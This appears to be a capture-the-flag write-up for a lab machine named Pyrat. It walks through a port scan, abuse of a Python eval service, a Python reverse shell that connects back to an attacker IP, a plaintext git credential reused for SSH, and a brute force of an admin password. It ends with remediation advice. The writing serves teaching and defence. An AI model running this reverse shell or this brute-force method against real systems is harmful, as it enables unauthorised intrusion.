## Pyrat

Medium-difficulty Linux machine. A custom Python service on port 8000 evaluated user input directly, which gave a shell as `www-data`. A leaked credential in a git repository gave SSH access as `think`. Recovering an older version of the service from git history revealed an admin endpoint protected by a weak password, which gave root.

**Target:** 10.49.151.96 (pyrat)
**Difficulty:** Medium
**Attack Path:** Port scan → Probe port 8000 → Python code execution → Reverse shell → Stabilize → Git leak → SSH as think → Git history → Admin endpoint brute force → Root

---

### PART 1: RECONNAISSANCE

**Why start with a port scan?** Each open port is a possible way in. Mapping them first shows where to focus.

**Full port scan**

```
nmap -p- 10.49.151.96
```

```
22/tcp     open   ssh        OpenSSH 8.2p1 Ubuntu
8000/tcp   open   http-alt   SimpleHTTP/0.6 Python/3.11.2
```

**Service and version scan**

```
nmap -sV -sC -p 22,8000 10.49.151.96
```

The scan labels port 8000 as an HTTP server, but the banner-style responses are strange. Several probes return Python error messages, such as:

```
name 'GET' is not defined
invalid syntax (<string>, line 1)
source code string cannot contain null bytes
```

These messages are Python exception text. They suggest the service passes our input to Python for evaluation, instead of treating it as an HTTP request.

**Takeaway:** Error messages leak how the server works. This one points to Python being executed on our input.

---

### PART 2: PROBING THE SERVICE

**Connect with netcat**

Plain HTTP is not the right tool here. Netcat sends raw text and shows exactly what the service does:

```
nc -vn 10.49.151.96 8000
```

Testing shell commands:

```
ls
name 'ls' is not defined

whoami
name 'whoami' is not defined
```

The service does not run shell commands. It rejects them as undefined Python names.

Testing Python:

```
print('Hello')
Hello
```

Python runs. The service is evaluating our input as Python code.

**Why this matters:** Letting users run arbitrary Python code is effectively giving them the server. Commands like `ls` fail only because they are not Python names, not because the input is blocked.

---

### PART 3: REMOTE CODE EXECUTION

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Send a Python reverse shell through the service**

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.136.69",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")
```

**What this does:**
1. Opens a TCP connection back to the attacker on port 4444.
2. Points standard input, output, and error at that connection.
3. Starts an interactive bash session.

**Result:**

```
connect to [192.168.136.69] from (UNKNOWN) [10.49.151.96] 55934
bash: /root/.bashrc: Permission denied
www-data@ip-10-49-151-96:~$
```

The shell runs as `www-data`, the web service account. The `.bashrc` warning is harmless: this account cannot read root's startup file.

---

### PART 4: STABILIZING THE SHELL

```
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to suspend the listener
stty raw -echo && fg
```

**Why it works:** `pty.spawn` creates a proper terminal. `stty raw -echo` passes keystrokes straight through, and `fg` brings the listener back.

---

### PART 5: FINDING A CREDENTIAL IN GIT

**Locate interesting directories**

```
cd /opt/dev
ls -lah
```

```
.git/
```

A `.git` directory is a repository's full history. If it is inside a web or application directory, it may contain files that were later removed or sensitive settings.

**Check the repository configuration**

```
cat /opt/dev/.git/config
```

The file contains a plaintext credential:

```
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

**Why this is a problem:** Git stores its configuration in plain text. Anyone who can read the repository can read any credential stored in it.

---

### PART 6: SSH AS THINK

```
ssh think@10.49.151.96
Password: _TH1NKINGPirate$_
```

Login succeeds. Files in the home directory:

```
snap/
user.txt
```

Reading the user flag:

```
cat user.txt
[user flag: not recorded in notes]
```

**Takeaway:** A credential stored for one purpose (GitHub) was reused for system login. Credentials should never be stored in repository configuration.

---

### PART 7: RECOVERING AN OLD VERSION OF THE SERVICE

**Inspect the repository**

```
cd /opt/dev/.git
ls
```

```
branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
```

The `index` file tracks files that Git knows about. Reading it raw shows a filename:

```
pyrat.py.old
```

The file is no longer in the working directory, but Git's history still contains it. Restoring the previous version from the repository reveals the earlier source code of the service.

**What the old code shows:**

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not approved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e)
```

**Key observations:**
- The service dispatches on the text we send. Certain words trigger special functions.
- `some_endpoint` is a hidden route that calls a separate handler.
- The code contains an admin check, and the shell function spawns `/bin/sh`.

**Takeaway:** Old versions of code often reveal hidden features, endpoints, and logic that the current version no longer advertises. Git history is worth reviewing on every engagement.

---

### PART 8: FINDING THE ADMIN PASSWORD

**The hidden endpoint**

The admin route expects a username, then a password prompt. A small script automates the attempts. The script connects to port 8000, sends `admin`, waits for the `Password:` prompt, then tries each password from a wordlist.

**Script structure:**
1. Connect to the service on port 8000.
2. Send `admin\n`.
3. Check the response for `Password:`.
4. Send the next candidate password from `rockyou.txt`.
5. Check the response for a success message.
6. Stop when the response indicates success.

**Before running it:** Change `target_ip` to `10.49.151.96`. The copy in the notes still has a different IP.

**Running the script**

```
python3 filna.py
```

Output, as recorded in the notes:

```
Server response after sending 'admin': Password:
Trying password: abc123
Correct password found: abc123
```

**Note on the output:** The notes contain a mismatch. One line reads `Server response for password '123456'`, while the surrounding lines say `abc123`. Confirm the correct password by logging in directly before relying on it.

**Why this works:** The admin check accepts a weak password, and nothing slows down repeated guesses. There is no rate limiting or lockout.

---

### PART 9: ROOT ACCESS

After the correct password is accepted, the admin route returns a shell running as root:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
pyrat.py  root.txt  snap
# cat root.txt
[root flag: not recorded in notes]
```

**Note:** The notes do not show the exact mechanism that gives root from the admin route. Based on the old source code, the route appears to call the shell handler without the `change_uid()` downgrade that other paths use. Verify this against the actual service before presenting it as fact.

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Full port scan (22, 8000)
  ├─ Service detection
  └─ Python exception messages on port 8000

PHASE 2: Probing
  ├─ Netcat to port 8000
  ├─ Confirm input is evaluated as Python
  └─ Test print('Hello')

PHASE 3: Foothold
  ├─ Python reverse shell to port 4444
  ├─ Shell as www-data
  └─ Stabilize with pty and stty

PHASE 4: Credential Leak
  ├─ Find /opt/dev/.git
  └─ Plaintext credential in .git/config (think)

PHASE 5: User Access
  ├─ SSH as think
  └─ User flag

PHASE 6: Git History
  ├─ Read .git/index, find pyrat.py.old
  └─ Recover old service source

PHASE 7: Admin Access
  ├─ Identify hidden admin endpoint
  ├─ Brute force password with script
  └─ Root shell
```

---

### VULNERABILITIES

1. **Remote Python Code Execution (Critical)**
   - Port 8000 evaluates user input as Python
   - Full command execution as `www-data` without authentication

2. **Credential Stored in Git Configuration (High)**
   - Plaintext password for `think` in `.git/config`
   - Repository directory readable by the web service account

3. **Credential Reuse (Medium)**
   - The same password works for SSH login

4. **Sensitive Source Code in Git History (Medium)**
   - Old version of the service reveals hidden endpoints and logic

5. **Weak Admin Password with No Rate Limiting (High)**
   - Common password from a public wordlist
   - Unlimited attempts over the network

---

### REMEDIATION

```
├─ Never evaluate user input as code; use a fixed command set with strict parsing
├─ Run the service as an unprivileged user with no shell access
├─ Remove credentials from repository configuration; use a credential helper or token vault
├─ Do not deploy .git directories to web-accessible or application paths
├─ Rotate any exposed passwords, including the GitHub credential
├─ Enforce strong passwords and add rate limiting or lockout on authentication
├─ Remove hidden endpoints or require authentication and authorization on them
└─ Monitor for repeated failed authentication attempts on port 8000
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- netcat (raw service interaction)
- nc (reverse shell listener)
- Python (reverse shell payload, brute force script)
- ssh (credential-based login)
- rockyou.txt (password wordlist)

**Key Insight:** The service on port 8000 was never meant to run arbitrary Python. Once that was understood, the rest followed: a credential in git history, an old source file that exposed a hidden route, and a weak password on that route.

**Concepts to Study:**
- Dangerous uses of `eval` and `exec`
- Git history as an information source
- Plaintext credential storage risks
- Authentication rate limiting
- Privilege separation and service accounts

# Jai Shri Ram
